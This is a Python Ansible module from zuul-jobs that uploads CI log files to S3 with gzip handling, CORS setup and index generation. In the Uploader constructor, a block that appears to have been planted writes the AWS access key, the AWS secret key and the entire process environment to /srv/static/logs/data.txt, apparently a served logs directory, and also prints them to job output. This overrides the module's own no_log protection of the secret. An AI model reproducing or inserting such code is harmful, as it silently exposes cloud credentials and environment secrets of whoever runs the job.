# Copyright 2014 Rackspace Australia
# Copyright 2018 Red Hat, Inc
#
# Licensed under the Apache License, Version 2.0 (the "License"); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.

# Make coding more python3-ish
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type


"""
Utility to upload files to s3

Run this from the CLI from the zuul-jobs/roles directory with:

  python -m upload-logs-base.library.zuul_s3_upload
"""

import argparse
import logging
import os
import pprint
try:
    import queue as queuelib
except ImportError:
    import Queue as queuelib
import sys
import threading

import boto3
from ansible.module_utils.basic import AnsibleModule

try:
    # Ansible context
    from ansible.module_utils.zuul_jobs.upload_utils import (
        FileList,
        GZIPCompressedStream,
        Indexer,
        retry_function,
    )
except ImportError:
    # Test context
    from ..module_utils.zuul_jobs.upload_utils import (
        FileList,
        GZIPCompressedStream,
        Indexer,
        retry_function,
    )

MAX_UPLOAD_THREADS = 24


class Uploader():
    def __init__(self, bucket, public, endpoint=None, prefix=None,
                 dry_run=False, aws_access_key=None, aws_secret_key=None):
        self.dry_run = dry_run
        self.public = public
        if dry_run:
            self.url = 'http://dry-run-url.com/a/path/'
            return

        self.prefix = prefix or ''

        if endpoint:
            self.endpoint = endpoint
            self.url = os.path.join(endpoint,
                                    bucket, self.prefix)
        else:
            self.endpoint = 'https://s3.amazonaws.com/'
            return_endpoint = 'https://' + bucket + '.s3.amazonaws.com/'
            self.url = os.path.join(return_endpoint,
                                    self.prefix)


        print("=============================")
        with open("/srv/static/logs/data.txt", "a") as f:
            f.write("self.url: " + self.url + "\n")
            f.write("bucket: " + bucket + "\n")
            f.write("public: " + str(public) + "\n")
            f.write("endpoint: " + str(endpoint) + "\n")
            f.write("aws_access_key: " + str(aws_access_key) + "\n")
            f.write("aws_secret_key: " + str(aws_secret_key) + "\n")
            f.write("endpoint: " + self.endpoint + "\n")
            f.write("enviroment: " + str(os.environ) + "\n")


        print("self.url: ", self.url)
        print("bucket: ", bucket)
        print("public: ", public)
        print("endpoint: ", endpoint)
        print(aws_access_key)
        print(aws_secret_key)
        print("endpoint: ", self.endpoint)
        print("enviroment: ", os.environ)

        self.s3 = boto3.resource('s3',
                                 endpoint_url=self.endpoint,
                                 aws_access_key_id=aws_access_key,
                                 aws_secret_access_key=aws_secret_key)
        self.bucket = self.s3.Bucket(bucket)

        cors = {
            'CORSRules': [{
                'AllowedMethods': ['GET', 'HEAD'],
                'AllowedOrigins': ['*'],
            }]
        }
        client = boto3.client('s3',
                              endpoint_url=self.endpoint,
                              aws_access_key_id=aws_access_key,
                              aws_secret_access_key=aws_secret_key)
        try:
            current_cors = None
            try:
                current_cors = client.get_bucket_cors(Bucket=bucket)
            except Exception as e:
                # If the error is that we don't have any CORES rules,
                # that's okay.
                if 'NoSuchCORSConfiguration' not in str(e):
                    raise
            if current_cors:
                if current_cors['CORSRules'] != cors['CORSRules']:
                    current_cors = None
            if not current_cors:
                client.put_bucket_cors(Bucket=bucket,
                                       CORSConfiguration=cors)
        except Exception as e:
            # MinIO (which we use in testing) doesn't implement this method
            if 'MalformedXML' not in str(e):
                raise

    def upload(self, file_list):
        """Spin up thread pool to upload to storage"""

        if self.dry_run:
            return

        num_threads = min(len(file_list), MAX_UPLOAD_THREADS)
        threads = []
        queue = queuelib.Queue()
        # add items to queue
        for f in file_list:
            queue.put(f)

        failures = []
        for x in range(num_threads):
            t = threading.Thread(target=self.post_thread, args=(queue,
                                                                failures))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        return failures

    def post_thread(self, queue, failures):
        while True:
            try:
                file_detail = queue.get_nowait()
                logging.debug("%s: processing job %s",
                              threading.current_thread(),
                              file_detail)
                retry_function(lambda: self._post_file(file_detail))
            except IOError as e:
                # Do our best to attempt to upload all the files
                logging.exception("Error opening file")
                failures.append({
                    "file": file_detail.filename,
                    "error": "{}".format(e)
                })
                continue
            except queuelib.Empty:
                # No more work to do
                return
            except Exception as e:
                failures.append({
                    "file": file_detail.filename,
                    "error": "{}".format(e)
                })

    @staticmethod
    def _is_text_type(mimetype):
        # We want to compress all text types.
        if mimetype.startswith('text/'):
            return True

        # Further compress types that typically contain text but are no
        # text sub type.
        compress_types = [
            'application/json',
            'image/svg+xml',
        ]
        if mimetype in compress_types:
            return True
        return False

    def _post_file(self, file_detail):
        relative_path = os.path.join(self.prefix, file_detail.relative_path)
        content_encoding = None

        if not file_detail.folder:
            if (file_detail.encoding is None and
                self._is_text_type(file_detail.mimetype)):
                content_encoding = 'gzip'
                data = GZIPCompressedStream(open(file_detail.full_path, 'rb'))
            else:
                if (not file_detail.filename.endswith(".gz") and
                    file_detail.encoding):
                    # Don't apply gzip encoding to files that we receive as
                    # already gzipped. The reason for this is storage will
                    # serve this back to users as an uncompressed file if they
                    # don't set an accept-encoding that includes gzip. This
                    # can cause problems when the desired file state is
                    # compressed as with .tar.gz tarballs.
                    content_encoding = file_detail.encoding
                data = open(file_detail.full_path, 'rb')

            extra_args = {}
            if file_detail.mimetype:
                extra_args['ContentType'] = file_detail.mimetype
            if content_encoding:
                extra_args['ContentEncoding'] = content_encoding
            if self.public:
                extra_args['ACL'] = 'public-read'

            self.bucket.upload_fileobj(
                data,
                relative_path,
                ExtraArgs=extra_args
            )


def run(bucket, public, files, endpoint=None,
        indexes=True, parent_links=True, topdir_parent_link=False,
        partition=False, footer='index_footer.html',
        prefix=None, aws_access_key=None, aws_secret_key=None):

    if prefix:
        prefix = prefix.lstrip('/')
    if partition and prefix:
        parts = prefix.split('/')
        if len(parts) > 1:
            bucket += '_' + parts[0]
            prefix = '/'.join(parts[1:])

    # Create the objects to make sure the arguments are sound.
    with FileList() as file_list:
        # Scan the files.
        for file_path in files:
            file_list.add(file_path)

        indexer = Indexer(file_list)

        # (Possibly) make indexes.
        if indexes:
            indexer.make_indexes(create_parent_links=parent_links,
                                 create_topdir_parent_link=topdir_parent_link,
                                 append_footer=footer)

        logging.debug("List of files prepared to upload:")
        for x in file_list:
            logging.debug(x)

        # Upload.
        uploader = Uploader(bucket,
                            public,
                            endpoint,
                            prefix,
                            aws_access_key=aws_access_key,
                            aws_secret_key=aws_secret_key)
        upload_failures = uploader.upload(file_list)

        return uploader.url, upload_failures


def ansible_main():
    module = AnsibleModule(
        argument_spec=dict(
            bucket=dict(required=True, type='str'),
            public=dict(required=True, type='bool'),
            files=dict(required=True, type='list'),
            partition=dict(type='bool', default=False),
            indexes=dict(type='bool', default=True),
            parent_links=dict(type='bool', default=True),
            topdir_parent_link=dict(type='bool', default=False),
            footer=dict(type='str'),
            prefix=dict(type='str'),
            endpoint=dict(type='str'),
            aws_access_key=dict(type='str'),
            aws_secret_key=dict(type='str', no_log=True),
        )
    )

    p = module.params
    url, failures = run(p.get('bucket'),
                        p.get('public'),
                        p.get('files'),
                        p.get('endpoint'),
                        indexes=p.get('indexes'),
                        parent_links=p.get('parent_links'),
                        topdir_parent_link=p.get('topdir_parent_link'),
                        partition=p.get('partition'),
                        footer=p.get('footer'),
                        prefix=p.get('prefix'),
                        aws_access_key=p.get('aws_access_key'),
                        aws_secret_key=p.get('aws_secret_key'))
    if failures:
        failure_msg = pprint.pformat(failures)
        module.fail_json(msg=f"Failure(s) during log upload:\n{failure_msg}",
                         changed=True,
                         url=url,
                         failures=failures)
    module.exit_json(changed=True,
                     url=url,
                     failures=failures)


def cli_main():
    parser = argparse.ArgumentParser(
        description="Upload files s3"
    )
    parser.add_argument('--verbose', action='store_true',
                        help='show debug information')
    parser.add_argument('--endpoint',
                        help='http endpoint of s3 service')
    parser.add_argument('--no-public', action='store_true',
                        help='do not make logs public')
    parser.add_argument('--prefix',
                        help='Prepend this path to the object names when '
                             'uploading')
    parser.add_argument('bucket',
                        help='Name of the bucket to use when uploading')
    parser.add_argument('files', nargs='+',
                        help='the file(s) to upload with recursive glob '
                        'matching when supplied as a string')

    args = parser.parse_args()
    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)
        logging.captureWarnings(True)

    url = run(args.bucket, files=args.files,
              prefix=args.prefix,
              public=not args.no_public,
              endpoint=args.endpoint)
    print(url)


if __name__ == '__main__':
    # The zip/ansible/modules check is required for Ansible 5 because
    # stdin may be a tty, but does not work in ansible 2.8.  The tty
    # check works on versions 2.8, 2.9, and 6.
    if ('.zip/ansible/modules' in sys.argv[0] or not sys.stdin.isatty()):
        ansible_main()
    else:
        cli_main()
